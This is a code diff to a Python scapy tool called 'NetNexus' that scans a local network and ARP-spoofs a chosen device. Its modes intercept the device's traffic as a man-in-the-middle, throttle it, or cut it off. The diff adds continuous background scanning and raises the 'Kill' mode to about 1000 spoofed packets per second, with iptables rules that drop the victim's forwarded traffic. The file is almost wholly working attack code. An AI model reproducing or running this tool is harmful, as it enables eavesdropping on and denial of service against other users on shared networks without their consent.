@@ -1,20 +1,22 @@
 import scapy.all as scapy
-import os, time, sys, subprocess
+import os, time, sys, subprocess, threading
 from core import scanner, spoof
 
+# Shared memory for the background scanner
+device_memory = {}
+stop_scanner = False
+
 def set_forwarding(state):
+    """Controls IP forwarding and firewall rules for Arch Linux."""
     if state:
-        # وضع الاعتراض: تفعيل التمرير وتنظيف الجدار الناري
         subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
         subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=0"], capture_output=True)
         subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
         subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], capture_output=True)
     else:
-        # وضع القتل: إغلاق كل المنافذ فوراً
         subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
         subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)
         subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
-        # استخدام -I لضمان وضع القاعدة في أعلى القائمة
         subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "DROP"], capture_output=True)
 
 def set_limit(interface, speed):
@@ -24,27 +26,35 @@ def set_limit(interface, speed):
                         "rate", f"{speed}kbps", "latency", "50ms", "burst", "1540"], check=True)
     except: pass
 
+def background_scanner(ip_range):
+    """Scans the network every 0.5 seconds in the background."""
+    global device_memory, stop_scanner
+    while not stop_scanner:
+        device_memory = scanner.scan(ip_range, device_memory)
+        time.sleep(0.5)
+
 def main():
-    iface = "wlan0" # تأكد من 'ip a'
+    global device_memory, stop_scanner
+    iface = "wlan0" # Verify your interface with 'ip a'
     scapy.conf.iface = iface
     
     if os.geteuid() != 0:
-        print("[-] Run with sudo!")
+        print("[-] NetNexus requires root privileges.")
         return
 
-    # تم التعديل بناءً على لقطة الشاشة الخاصة بك
     gateway_ip = "192.168.8.1"
     ip_range = "192.168.8.1/24"
-    device_memory = {} 
+
+    # Start background scan thread
+    scan_thread = threading.Thread(target=background_scanner, args=(ip_range,), daemon=True)
+    scan_thread.start()
 
     while True:
         print("\n" + "="*45)
-        print("      NetNexus: Hard-Kill v5.0")
+        print("      NetNexus: High-Performance Build")
         print("="*45)
         
-        device_memory = scanner.scan(ip_range, device_memory)
         current_list = list(device_memory.values())
-        
         for index, dev in enumerate(current_list):
             print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
         
@@ -52,16 +62,20 @@ def main():
         print("[R] Refresh  [C] Exit")
         
         user_input = input("\nSelect ID: ").lower().strip()
-        if user_input == 'c': sys.exit()
+        if user_input == 'c': 
+            stop_scanner = True
+            sys.exit()
         if user_input == 'r': continue
         
         try:
             target = current_list[int(user_input)]
-            print(f"\nTarget: {target['ip']} | [1] Intercept [2] Limit [3] Kill")
+            print(f"\n[1] Intercept [2] Limit [3] Kill")
             mode = input("Action: ")
 
             gateway_mac, _ = spoof.get_device_info(gateway_ip)
-            wait_time = 0.5
+            
+            # 0.002s delay * 2 packets per loop ≈ 1000 packets per second
+            wait_time = 0.002 if mode == "3" else 0.5
 
             if mode == "1":
                 set_forwarding(True)
@@ -71,9 +85,8 @@ def main():
                 set_limit(iface, kbps)
             elif mode == "3":
                 set_forwarding(False)
-                wait_time = 0.01 # سرعة جنونية للتفوق على الراوتر
 
-            print(f"[*] Attacking {target['ip']}... Ctrl+C to stop.")
+            print(f"[*] Attacking {target['ip']} at 1000 pkts/s...")
             while True:
                 spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
                 time.sleep(wait_time) 
@@ -85,7 +98,7 @@ def main():
             subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
             spoof.restore(target['ip'], gateway_ip)
             spoof.restore(gateway_ip, target['ip'])
-            break
+            print("\n[*] Resetting...")
 
 if __name__ == "__main__":
     main()
